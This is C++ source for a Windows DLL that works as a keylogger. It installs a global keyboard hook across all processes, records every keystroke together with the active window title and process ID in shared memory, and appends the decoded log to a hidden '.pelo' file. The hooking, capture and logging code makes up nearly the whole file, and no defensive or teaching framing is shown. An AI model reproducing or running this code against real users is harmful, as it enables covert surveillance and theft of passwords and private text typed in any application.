#include "pch.h"
#include "Pell.h"
#include "window_manager.h"
#include "keyboard_tracer.h"
#include <thread>
#include <fstream>
#include <string>
#include <atlstr.h>
#include <vector>
#include <regex>

#pragma data_seg(".sharedata")
HHOOK hHook = 0;
HANDLE hSharedMem = 0;
int windowChangeCnt = 0;
HWND hWnd = 0;
#pragma data_seg()

HINSTANCE hInst;
WindowManager* window_manager;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hInst = (HINSTANCE)hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


#pragma region Export DLL 
extern "C" __declspec(dllexport) void init()
{
	initialize();
}

extern "C" __declspec(dllexport) void exit_key_log_info()
{
	delete window_manager;
}

extern "C" __declspec(dllexport) void print_win_title()
{
	window_manager->PrintWinTitle();
}

extern "C" __declspec(dllexport) void my_get_foreground_window()
{
	hWnd = GetForegroundWindow();
	if (hWnd == NULL)
	{
		std::cout << "[!!!] fail to set Window handle." << std::endl;

	}
	else
	{
		std::cout << "[*] set Window handle." << std::endl;
	}
	char buf[100];
	GetWindowTextA(hWnd, buf, 100);
	window_manager->SetWinTitle(buf);
	window_manager->SetWindowHandle(hWnd);
}

extern "C" __declspec(dllexport) void my_set_process_id()
{
	DWORD id;
	GetWindowThreadProcessId(hWnd, &id);
	window_manager->SetProcessId(id);
}

extern "C" __declspec(dllexport) DWORD get_process_id()
{
	return window_manager->GetProcessId();
}

extern "C" __declspec(dllexport) char* get_win_title()
{
	return window_manager->GetWinTitle();
}


extern "C" __declspec(dllexport) void startHook(int m_maxKeyCnt)
{
	if (hWnd == NULL)
	{
		std::cout << "[!!!] window handle is null. fail to start hook" << std::endl;
		return;
	}

	keyLogInfo* info = getKeyLogSharedMemory(windowChangeCnt);
	if (info == NULL)
	{
		std::cout << "[!!!] fail making shared memory" << std::endl;
	}
	initKeyLogInfo(info);

	hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, hInst, 0);

	if (hHook == NULL)
	{
		std::cout << "[!!!] hook is null. fail to start hook" << std::endl;
		return;
	}

	std::cout << "[*] successfull, start hook." << std::endl;
	return;
}

extern "C" __declspec(dllexport) bool endHook()
{
	for (int i = 0; i <= windowChangeCnt; i++)
	{
		hSharedMem = setKeyLogSharedMemory(i);
		printKeyLog(i);
		writeKeyLog(i);
		refreshKeyLogSharedMemory(i);
		CloseHandle(hSharedMem);
	}
	std::cout << "[*] finish keyboard hook." << std::endl;
	return UnhookWindowsHookEx(hHook);
}

extern "C" __declspec(dllexport) void say(std::string str)
{
	std::cout << str << std::endl;
}
#pragma endregion


void initialize()
{
	window_manager = new WindowManager();
}

LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
	{
		return CallNextHookEx(0, nCode, wParam, lParam);
	}
	int fUp = 0x40000000 & lParam;
	if (nCode == HC_ACTION && !fUp)
	{
		HWND hWndNow = GetForegroundWindow();
		if (hWnd != hWndNow)
		{
			hWnd = hWndNow;
			windowChangeCnt++;
			keyLogInfo* info = getKeyLogSharedMemory(windowChangeCnt);
			initKeyLogInfo(info);
			info->wp[info->keyCnt] = wParam;
			info->keyCnt++;
		}
		else
		{
			keyLogInfo* info = getKeyLogSharedMemory(windowChangeCnt);
			info->wp[info->keyCnt] = wParam;
			info->keyCnt++;
		}
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

LPCTSTR getSharedMemoryName(int id)
{
	std::string msg = KEY_LOG_MEMORY;
	msg += std::to_string(id);
	CString s(msg.c_str());
	LPCTSTR name = s;
	return name;
}

HANDLE setKeyLogSharedMemory(int windowCnt)
{
	int size = sizeof(keyLogInfo);
	return setSharedMemory(size, getSharedMemoryName(windowCnt));
}

keyLogInfo* getKeyLogSharedMemory(int windowCnt)
{
	int size = sizeof(keyLogInfo);
	return getSharedMemory<keyLogInfo>(size, getSharedMemoryName(windowCnt));
}

HANDLE setSharedMemory(int size, LPCTSTR name)
{
	HANDLE ret = CreateFileMapping(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		NULL,
		size,
		name);
	return ret;
}

template<typename T> T* getSharedMemory(int size, LPCTSTR name)
{
	hSharedMem = setSharedMemory(size, name);
	if (hSharedMem == 0) { return NULL; }
	T* pMem = (T*)MapViewOfFile(
		hSharedMem,
		FILE_MAP_WRITE,
		0,
		0,
		size);
	return pMem;
}

void initKeyLogInfo(keyLogInfo *info)
{
	refreshKeyLogSharedMemory(info);
	GetWindowTextA(hWnd, info->title, TITLE_SIZE);
	GetWindowThreadProcessId(hWnd, &info->pid);
	info->keyCnt = 0;
}

void printKeyLog(int windowId)
{
	keyLogInfo* info = getKeyLogSharedMemory(windowId);
	KeyboardTracer* tracer = new KeyboardTracer();
	if (info != NULL)
	{
		std::cout << "NO." << windowId << " KEY LOG INFO WINDOW {" << std::endl;
		std::cout << "  title: " << info->title << std::endl;
		std::cout << "  pid: " << info->pid << std::endl;
		std::cout << "  keyCnt: " << info->keyCnt << std::endl;
		std::string key_log = "";
		for (int i = 0; i < info->keyCnt; i++)
		{
			key_log += tracer->transVirtualKey(info->wp[i]);
		}
		std::cout << "  keylog: " << key_log << std::endl;
		std::cout << "}" << std::endl;

		UnmapViewOfFile(info);
	}
	delete tracer;
}

void writeKeyLog(int windowId)
{
	std::ofstream outputfile;
	char path[MAX_PATH];
	int size = sizeof(path) / sizeof(path[0]);
	GetModuleFileNameA(hInst, path, size);
	std::string path_str = "";
	for (int i = 0; i < size; i++)
	{
		path_str += path[i];
	}
	int pos = path_str.rfind("dll");
	path_str = path_str.substr(0, pos);
	pos = path_str.rfind("\\");
	path_str = path_str.substr(0, pos);
	std::cout << "path_str " << path_str << std::endl;
	path_str += "/.pelo";


	outputfile.open(path_str, std::ios::app);
	keyLogInfo* info = getKeyLogSharedMemory(windowId);
	KeyboardTracer* tracer = new KeyboardTracer();
	if (info != NULL)
	{
		outputfile << "NO." << windowId << " KEY LOG INFO WINDOW {" << std::endl;
		outputfile << "  title: " << info->title << std::endl;
		outputfile << "  pid: " << info->pid << std::endl;
		outputfile << "  keyCnt: " << info->keyCnt << std::endl;
		std::string key_log = "";
		for (int i = 0; i < info->keyCnt; i++)
		{
			key_log += tracer->transVirtualKey(info->wp[i]);
		}
		outputfile << "  keylog: " << key_log << std::endl;
		outputfile << "}" << std::endl;

		UnmapViewOfFile(info);
	}
	outputfile.close();
	delete tracer;
}

void getDllPath()
{
	char path[MAX_PATH];
	int size = sizeof(path) / sizeof(path[0]);
	GetModuleFileNameA(hInst, path, size);
	std::string path_str = "";
	for (int i = 0; i < size; i++)
	{
		path_str += path[i];
	}
	int pos = path_str.rfind("dll");
	path_str = path_str.substr(0, pos);
	pos = path_str.rfind("\\");
	path_str = path_str.substr(0, pos);
	std::cout << "path_str " << path_str << std::endl;
	//return path_str;
}


void refreshKeyLogSharedMemory(keyLogInfo* info)
{
	*info->title = NULL;
	info->pid = NULL;
	info->keyCnt = NULL;
	for (int i = 0; i < MAX_KEY_COUNT; i++)
	{
		info->wp[i] = NULL;
	}
}

void refreshKeyLogSharedMemory(int windowId)
{
	keyLogInfo* info = getKeyLogSharedMemory(windowId);
	*info->title = NULL;
	info->pid = NULL;
	info->keyCnt = NULL;
	for (int i = 0; i < MAX_KEY_COUNT; i++)
	{
		info->wp[i] = NULL;
	}
}

void myMessageBox(std::string str)
{
	int len = strlen(str.c_str());
	wchar_t t[128] = L"";
	for (int i = 0; i < len; i++)
	{
		t[i] = str[i];
	}
	MessageBoxW(hWnd, t, TEXT("click"), MB_OK);
}

